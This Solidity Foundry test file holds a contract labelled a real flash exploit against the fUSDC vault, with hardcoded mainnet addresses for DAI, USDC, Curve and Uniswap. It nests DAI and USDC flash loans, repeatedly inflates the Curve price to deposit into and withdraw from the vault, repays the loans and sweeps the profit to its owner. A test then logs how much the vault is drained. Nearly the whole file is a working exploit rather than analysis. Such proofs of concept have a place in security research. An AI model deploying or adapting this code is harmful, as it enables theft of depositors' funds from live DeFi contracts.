// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

interface IUniV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @dev Real flash exploit contract for fUSDC
contract FUSDCFlashDrainer {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    // DAI/WETH pair: token0=DAI, token1=WETH
    address constant UNI_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    // USDC/WETH pair: token0=USDC, token1=WETH
    address constant UNI_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 public flashDAI;
    uint256 public flashUSDC;
    uint256 public iterations;
    address public owner;
    bool inInner;

    constructor() {
        owner = msg.sender;
    }

    function execute(uint256 _flashDAI, uint256 _flashUSDC, uint256 _iters) external {
        require(msg.sender == owner);
        flashDAI = _flashDAI;
        flashUSDC = _flashUSDC;
        iterations = _iters;

        // Outer flash: borrow DAI from DAI/WETH pair
        // DAI is token0
        IUniV2Pair(UNI_DAI_WETH).swap(
            _flashDAI,  // amount0Out = DAI
            0,          // amount1Out = WETH
            address(this),
            abi.encode(uint256(1)) // non-empty data triggers callback
        );
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == UNI_DAI_WETH && !inInner) {
            // Outer callback: DAI borrowed. Now borrow USDC.
            inInner = true;
            IUniV2Pair(UNI_USDC_WETH).swap(
                flashUSDC,  // amount0Out = USDC (token0 in USDC/WETH)
                0,          // amount1Out
                address(this),
                abi.encode(uint256(2))
            );
            inInner = false;

            // Repay DAI flash: need flashDAI * 1000/997 + 1
            uint256 daiRepay = (flashDAI * 1000 / 997) + 1;
            IERC20(DAI).transfer(UNI_DAI_WETH, daiRepay);
        } else if (msg.sender == UNI_USDC_WETH) {
            // Inner callback: both DAI and USDC available. Do the exploit loop.
            _doExploit();

            // After exploit, we have excess USDC and deficit DAI.
            // Convert enough USDC -> DAI to cover DAI repayment.
            uint256 daiRepayNeeded = (flashDAI * 1000 / 997) + 1;
            uint256 daiHave = IERC20(DAI).balanceOf(address(this));
            if (daiHave < daiRepayNeeded) {
                uint256 daiDeficit = daiRepayNeeded - daiHave;
                // Swap USDC -> DAI to cover deficit (add 1% buffer for slippage)
                uint256 usdcToSell = (daiDeficit / 1e12) * 102 / 100;
                ICurveYPool(CURVE).exchange_underlying(1, 0, usdcToSell, 0);
            }

            // Repay USDC flash
            uint256 usdcRepay = (flashUSDC * 1000 / 997) + 1;
            IERC20(USDC).transfer(UNI_USDC_WETH, usdcRepay);
        }
    }

    function _doExploit() internal {
        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 usdcCapital = flashUSDC; // dump capital

        for (uint256 i = 0; i < iterations; i++) {
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            if (daiBal < 1e18) break;

            // PUMP: DAI -> USDC on Curve
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, daiBal, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            // DEPOSIT pumped USDC
            IHVault(FUSDC).deposit(pumpedUSDC);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            // DUMP: USDC -> DAI on Curve (restore pool)
            uint256 dumpAmt = IERC20(USDC).balanceOf(address(this));
            if (dumpAmt > usdcCapital) dumpAmt = usdcCapital;
            ICurveYPool(CURVE).exchange_underlying(1, 0, dumpAmt, 0);

            // WITHDRAW
            IHVault(FUSDC).withdraw(shares);
        }
    }

    function sweep() external {
        require(msg.sender == owner);
        uint256 usdcBal = IERC20(USDC).balanceOf(address(this));
        if (usdcBal > 0) IERC20(USDC).transfer(owner, usdcBal);
        uint256 daiBal = IERC20(DAI).balanceOf(address(this));
        if (daiBal > 0) IERC20(DAI).transfer(owner, daiBal);
    }
}

contract TestFUSDCRealFlash is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    function testRealFlashDrain() public {
        FUSDCFlashDrainer drainer = new FUSDCFlashDrainer();

        uint256 vaultBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        // Execute: 19M DAI flash, 19M USDC flash, 10 iterations
        drainer.execute(19_000_000e18, 19_000_000e6, 10);

        drainer.sweep();

        uint256 usdcProfit = IERC20(USDC).balanceOf(address(this));
        uint256 daiProfit = IERC20(DAI).balanceOf(address(this));
        uint256 vaultAfter = IHVault(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_uint("USDC profit", usdcProfit);
        emit log_named_uint("DAI profit", daiProfit);
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));

        // Net in DAI terms (profit should be > 0 after flash fees)
        int256 netDAI = int256(usdcProfit) * 1e12 + int256(daiProfit);
        emit log_named_int("Net profit (DAI units)", netDAI);
    }
}
